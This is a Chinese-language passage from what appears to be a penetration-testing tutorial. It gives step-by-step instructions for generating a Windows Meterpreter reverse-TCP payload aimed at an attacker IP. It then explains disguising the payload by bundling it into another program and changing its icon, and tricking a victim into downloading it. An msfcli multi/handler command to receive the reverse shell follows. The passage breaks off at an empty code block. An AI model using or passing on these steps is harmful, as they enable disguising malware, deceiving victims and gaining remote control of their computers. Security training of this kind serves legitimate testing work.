    2. 选择负载 `9: Powershell/virtualalloc`。

    3. 选择 `generate the payload`（生成负载）。

    4. 选择 `msfvenom`。

    5. 选择 `windows/meterpreter/reverse_tcp`。

    6. 选择 `lhost`（黑客机器的 IP：`192.168.52.135`）。

    7. 选择任意 `lport`。

    8. 选择负载的名称。


    使用如 `winrar` 等压缩程序将负载附加到另一个程序中。使用图标更改器更改图标。通过任何技巧让客户端下载文件。使用 `msfcli` 运行 `multi-handler`
    工具来攻击客户端：

    ```bash

    msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.52.135
    lport=4444

    ```

    一旦客户端连接上，`meterpreter` 会话将会打开。使用 `evilgrade` 管理攻击。


    ```bash

